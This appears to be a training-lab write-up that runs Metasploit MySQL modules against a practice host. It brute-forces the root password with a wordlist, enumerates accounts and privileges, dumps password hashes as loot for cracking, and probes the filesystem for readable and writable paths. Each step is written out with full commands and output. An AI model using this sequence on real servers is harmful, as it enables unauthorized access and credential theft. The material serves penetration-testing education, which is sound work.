# MySQL Enumeration

### Target
`demo.ine.local`

### Objectives
Test the following modules:
* auxiliary/scanner/mysql/mysql_version
* auxiliary/scanner/mysql/mysql_login
* auxiliary/admin/mysql/mysql_enum
* auxiliary/admin/mysql/mysql_sql
* auxiliary/scanner/mysql/mysql_file_enum
* auxiliary/scanner/mysql/mysql_hashdump
* auxiliary/scanner/mysql/mysql_schemadump
* auxiliary/scanner/mysql/mysql_writable_dirs

--- 
We first set up `demo.ine.local` as a global **RHOST** and then first check for sql version.
```bash
msf6 > use auxiliary/scanner/mysql/mysql_version 
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 auxiliary(scanner/mysql/mysql_version) > setg RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 auxiliary(scanner/mysql/mysql_version) > run
[+] 192.57.19.3:3306 - 192.57.19.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
[*] demo.ine.local:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Nxt we try to check for any admin passwords. We set up the username as **root** and use the **mysql_login** module.
```bash
msf6 auxiliary(scanner/mysql/mysql_login) > set USERNAME root
USERNAME => root
msf6 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf6 auxiliary(scanner/mysql/mysql_login) > set VeRBOSE false
VeRBOSE => false
msf6 auxiliary(scanner/mysql/mysql_login) > run

[+] 192.57.19.3:3306      - 192.57.19.3:3306 - Success: 'root:twinkle'
[*] demo.ine.local:3306   - Scanned 1 of 1 hosts (100% complete)
[*] demo.ine.local:3306   - Bruteforce completed, 1 credential was successful.
[*] demo.ine.local:3306   - You can open an MySQL session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mysql/mysql_login) > 
```
We found the password for **root**. Now we use this password to see if we can enumerate any other data from it.
```bash
msf6 auxiliary(admin/mysql/mysql_enum) > set UserNAME root
UserNAME => root
msf6 auxiliary(admin/mysql/mysql_enum) > set PaSSWORD twinkle
PaSSWORD => twinkle
msf6 auxiliary(admin/mysql/mysql_enum) > run
[*] Running module against 192.57.19.3

[*] 192.57.19.3:3306 - Running MySQL Enumerator...
[*] 192.57.19.3:3306 - Enumerating Parameters
[*] 192.57.19.3:3306 -  MySQL Version: 5.5.61-0ubuntu0.14.04.1
[*] 192.57.19.3:3306 -  Compiled for the following OS: debian-linux-gnu
[*] 192.57.19.3:3306 -  Architecture: x86_64
[*] 192.57.19.3:3306 -  Server Hostname: demo.ine.local
[*] 192.57.19.3:3306 -  Data Directory: /var/lib/mysql/
[*] 192.57.19.3:3306 -  Logging of queries and logins: OFF
[*] 192.57.19.3:3306 -  Old Password Hashing Algorithm OFF
[*] 192.57.19.3:3306 -  Loading of local files: ON
[*] 192.57.19.3:3306 -  Deny logins with old Pre-4.1 Passwords: OFF
[*] 192.57.19.3:3306 -  Allow Use of symlinks for Database Files: YES
[*] 192.57.19.3:3306 -  Allow Table Merge: 
[*] 192.57.19.3:3306 -  SSL Connection: DISABLED
[*] 192.57.19.3:3306 - Enumerating Accounts:
[*] 192.57.19.3:3306 -  List of Accounts with Password Hashes:
[+] 192.57.19.3:3306 -          User: root Host: localhost Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.57.19.3:3306 -          User: root Host: 891b50fafb0f Password Hash: 
[+] 192.57.19.3:3306 -          User: root Host: 127.0.0.1 Password Hash: 
[+] 192.57.19.3:3306 -          User: root Host: ::1 Password Hash: 
[+] 192.57.19.3:3306 -          User: debian-sys-maint Host: localhost Password Hash: *F4E71A0BE028B3688230B992EEAC70BC598FA723
[+] 192.57.19.3:3306 -          User: root Host: % Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.57.19.3:3306 -          User: filetest Host: % Password Hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.57.19.3:3306 -          User: ultra Host: localhost Password Hash: *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
[+] 192.57.19.3:3306 -          User: guest Host: localhost Password Hash: *17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.57.19.3:3306 -          User: gopher Host: localhost Password Hash: *027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.57.19.3:3306 -          User: backup Host: localhost Password Hash: *E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.57.19.3:3306 -          User: sysadmin Host: localhost Password Hash: *78A1258090DAA81738418E11B73EB494596DFDD3
[*] 192.57.19.3:3306 -  The following users have GRANT Privilege:
[*] 192.57.19.3:3306 -          User: root Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.57.19.3:3306 -          User: root Host: 127.0.0.1
[*] 192.57.19.3:3306 -          User: root Host: ::1
[*] 192.57.19.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: %
[*] 192.57.19.3:3306 -  The following users have CREATE USER Privilege:
[*] 192.57.19.3:3306 -          User: root Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.57.19.3:3306 -          User: root Host: 127.0.0.1
[*] 192.57.19.3:3306 -          User: root Host: ::1
[*] 192.57.19.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: %
[*] 192.57.19.3:3306 -  The following users have RELOAD Privilege:
[*] 192.57.19.3:3306 -          User: root Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.57.19.3:3306 -          User: root Host: 127.0.0.1
[*] 192.57.19.3:3306 -          User: root Host: ::1
[*] 192.57.19.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: %
[*] 192.57.19.3:3306 -  The following users have SHUTDOWN Privilege:
[*] 192.57.19.3:3306 -          User: root Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.57.19.3:3306 -          User: root Host: 127.0.0.1
[*] 192.57.19.3:3306 -          User: root Host: ::1
[*] 192.57.19.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: %
[*] 192.57.19.3:3306 -  The following users have SUPER Privilege:
[*] 192.57.19.3:3306 -          User: root Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.57.19.3:3306 -          User: root Host: 127.0.0.1
[*] 192.57.19.3:3306 -          User: root Host: ::1
[*] 192.57.19.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: %
[*] 192.57.19.3:3306 -  The following users have FILE Privilege:
[*] 192.57.19.3:3306 -          User: root Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.57.19.3:3306 -          User: root Host: 127.0.0.1
[*] 192.57.19.3:3306 -          User: root Host: ::1
[*] 192.57.19.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: %
[*] 192.57.19.3:3306 -          User: filetest Host: %
[*] 192.57.19.3:3306 -  The following users have PROCESS Privilege:
[*] 192.57.19.3:3306 -          User: root Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.57.19.3:3306 -          User: root Host: 127.0.0.1
[*] 192.57.19.3:3306 -          User: root Host: ::1
[*] 192.57.19.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: %
[*] 192.57.19.3:3306 -  The following accounts have privileges to the mysql database:
[*] 192.57.19.3:3306 -          User: root Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.57.19.3:3306 -          User: root Host: 127.0.0.1
[*] 192.57.19.3:3306 -          User: root Host: ::1
[*] 192.57.19.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.57.19.3:3306 -          User: root Host: %
[*] 192.57.19.3:3306 -  The following accounts have empty passwords:
[*] 192.57.19.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.57.19.3:3306 -          User: root Host: 127.0.0.1
[*] 192.57.19.3:3306 -          User: root Host: ::1
[*] 192.57.19.3:3306 -  The following accounts are not restricted by source:
[*] 192.57.19.3:3306 -          User: filetest Host: %
[*] 192.57.19.3:3306 -          User: root Host: %
[*] Auxiliary module execution completed
msf6 auxiliary(admin/mysql/mysql_enum) > 
```
Next we will try to seee if we can run sql commands dirctly to the server via the **mysql_sql** module.  
```bash
msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
USERNAME => root
msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD twinkle
PASSWORD => twinkle
msf6 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 192.57.19.3

[*] 192.57.19.3:3306 - Sending statement: 'select version()'...
[*] 192.57.19.3:3306 -  | 5.5.61-0ubuntu0.14.04.1 |
[*] Auxiliary module execution completed
msf6 auxiliary(admin/mysql/mysql_sql) > 
```
We then try to see if we can enumerate anyother file or dirctory via the **mysql_file_enum** module.
```bash
msf6 auxiliary(scanner/mysql/mysql_file_enum) > set PASSWORD twinkle
PASSWORD => twinkle
msf6 auxiliary(scanner/mysql/mysql_file_enum) > set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
FILE_LIST => /usr/share/metasploit-framework/data/wordlists/directory.txt
msf6 auxiliary(scanner/mysql/mysql_file_enum) > set verbose true 
verbose => true
msf6 auxiliary(scanner/mysql/mysql_file_enum) > run
[*] 192.57.19.3:3306 - Login...
[+] 192.57.19.3:3306 - 192.57.19.3:3306 MySQL - Logged in to '' with 'root':'twinkle'
[*] 192.57.19.3:3306 - 192.57.19.3:3306 MySQL - querying with 'SELECT * FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'mysql' AND TABLE_NAME = 'SSqAgPmM';'
[*] 192.57.19.3:3306 - Table doesn't exist so creating it
[*] 192.57.19.3:3306 - 192.57.19.3:3306 MySQL - querying with 'CREATE TABLE SSqAgPmM (brute int);'
[+] 192.57.19.3:3306 - /tmp is a directory and exists
[+] 192.57.19.3:3306 - /etc/passwd is a file and exists
[!] 192.57.19.3:3306 - /etc/shadow does not exist
[+] 192.57.19.3:3306 - /root is a directory and exists
[+] 192.57.19.3:3306 - /home is a directory and exists
[+] 192.57.19.3:3306 - /etc is a directory and exists
[+] 192.57.19.3:3306 - /etc/hosts is a file and exists
[+] 192.57.19.3:3306 - /usr/share is a directory and exists
[!] 192.57.19.3:3306 - /etc/config does not exist
[!] 192.57.19.3:3306 - /data does not exist
[!] 192.57.19.3:3306 - /webdav does not exist
[!] 192.57.19.3:3306 - /doc does not exist
[!] 192.57.19.3:3306 - /icons does not exist
[!] 192.57.19.3:3306 - /manual does not exist
[!] 192.57.19.3:3306 - /pro does not exist
[!] 192.57.19.3:3306 - /secure does not exist
[!] 192.57.19.3:3306 - /poc does not exist
[!] 192.57.19.3:3306 - /pro does not exist
[!] 192.57.19.3:3306 - /dir does not exist
[!] 192.57.19.3:3306 - /Benefits does not exist
[!] 192.57.19.3:3306 - /Data does not exist
[!] 192.57.19.3:3306 - /Invitation does not exist
[!] 192.57.19.3:3306 - /Office does not exist
[!] 192.57.19.3:3306 - /Site does not exist
[!] 192.57.19.3:3306 - /Admin does not exist
[+] 192.57.19.3:3306 - /etc is a directory and exists
[*] 192.57.19.3:3306 - Cleaning up the temp table
[*] 192.57.19.3:3306 - 192.57.19.3:3306 MySQL - querying with 'DROP TABLE SSqAgPmM'
[*] demo.ine.local:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mysql/mysql_file_enum) > 
```
Since we already had a few user accounts and their hashes, we will use the **mysql_hashdump** module to store them so that we can use them later for cracking.  
```bash
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
USERNAME => root
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD twinkle
PASSWORD => twinkle
msf6 auxiliary(scanner/mysql/mysql_hashdump) > run

[+] 192.57.19.3:3306 - Saving HashString as Loot: root:*A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.57.19.3:3306 - Saving HashString as Loot: root:
[+] 192.57.19.3:3306 - Saving HashString as Loot: root:
[+] 192.57.19.3:3306 - Saving HashString as Loot: root:
[+] 192.57.19.3:3306 - Saving HashString as Loot: debian-sys-maint:*F4E71A0BE028B3688230B992EEAC70BC598FA723
[+] 192.57.19.3:3306 - Saving HashString as Loot: root:*A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.57.19.3:3306 - Saving HashString as Loot: filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.57.19.3:3306 - Saving HashString as Loot: ultra:*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
[+] 192.57.19.3:3306 - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.57.19.3:3306 - Saving HashString as Loot: gopher:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.57.19.3:3306 - Saving HashString as Loot: backup:*E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.57.19.3:3306 - Saving HashString as Loot: sysadmin:*78A1258090DAA81738418E11B73EB494596DFDD3
[*] demo.ine.local:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mysql/mysql_hashdump) > 
```
Next we try to check for any writable directory on the server.  
```bash
msf6 auxiliary(scanner/mysql/mysql_writable_dirs) > set PASSWORD twinkle
PASSWORD => twinkle
msf6 auxiliary(scanner/mysql/mysql_writable_dirs) > set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
DIR_LIST => /usr/share/metasploit-framework/data/wordlists/directory.txt
msf6 auxiliary(scanner/mysql/mysql_writable_dirs) > run

[!] 192.57.19.3:3306 - For every writable directory found, a file called bfjIgouh with the text test will be written to the directory.
[*] 192.57.19.3:3306 - Login...
[*] 192.57.19.3:3306 - Checking /tmp...
[+] 192.57.19.3:3306 - /tmp is writeable
[*] 192.57.19.3:3306 - Checking /etc/passwd...
[!] 192.57.19.3:3306 - Can't create/write to file '/etc/passwd/bfjIgouh' (Errcode: 20)
[*] 192.57.19.3:3306 - Checking /etc/shadow...
[!] 192.57.19.3:3306 - Can't create/write to file '/etc/shadow/bfjIgouh' (Errcode: 20)
[*] 192.57.19.3:3306 - Checking /root...
[+] 192.57.19.3:3306 - /root is writeable
[*] 192.57.19.3:3306 - Checking /home...
[!] 192.57.19.3:3306 - Can't create/write to file '/home/bfjIgouh' (Errcode: 13)
[*] 192.57.19.3:3306 - Checking /etc...
[!] 192.57.19.3:3306 - Can't create/write to file '/etc/bfjIgouh' (Errcode: 13)
[*] 192.57.19.3:3306 - Checking /etc/hosts...
[!] 192.57.19.3:3306 - Can't create/write to file '/etc/hosts/bfjIgouh' (Errcode: 20)
[*] 192.57.19.3:3306 - Checking /usr/share...
[!] 192.57.19.3:3306 - Can't create/write to file '/usr/share/bfjIgouh' (Errcode: 13)
[*] 192.57.19.3:3306 - Checking /etc/config...
[!] 192.57.19.3:3306 - Can't create/write to file '/etc/config/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /data...
[!] 192.57.19.3:3306 - Can't create/write to file '/data/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /webdav...
[!] 192.57.19.3:3306 - Can't create/write to file '/webdav/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /doc...
[!] 192.57.19.3:3306 - Can't create/write to file '/doc/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /icons...
[!] 192.57.19.3:3306 - Can't create/write to file '/icons/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /manual...
[!] 192.57.19.3:3306 - Can't create/write to file '/manual/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /pro...
[!] 192.57.19.3:3306 - Can't create/write to file '/pro/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /secure...
[!] 192.57.19.3:3306 - Can't create/write to file '/secure/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /poc...
[!] 192.57.19.3:3306 - Can't create/write to file '/poc/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /pro...
[!] 192.57.19.3:3306 - Can't create/write to file '/pro/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /dir...
[!] 192.57.19.3:3306 - Can't create/write to file '/dir/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /Benefits...
[!] 192.57.19.3:3306 - Can't create/write to file '/Benefits/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /Data...
[!] 192.57.19.3:3306 - Can't create/write to file '/Data/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /Invitation...
[!] 192.57.19.3:3306 - Can't create/write to file '/Invitation/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /Office...
[!] 192.57.19.3:3306 - Can't create/write to file '/Office/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /Site...
[!] 192.57.19.3:3306 - Can't create/write to file '/Site/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /Admin...
[!] 192.57.19.3:3306 - Can't create/write to file '/Admin/bfjIgouh' (Errcode: 2)
[*] 192.57.19.3:3306 - Checking /etc...
[!] 192.57.19.3:3306 - Can't create/write to file '/etc/bfjIgouh' (Errcode: 13)
[*] demo.ine.local:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mysql/mysql_writable_dirs) > 
```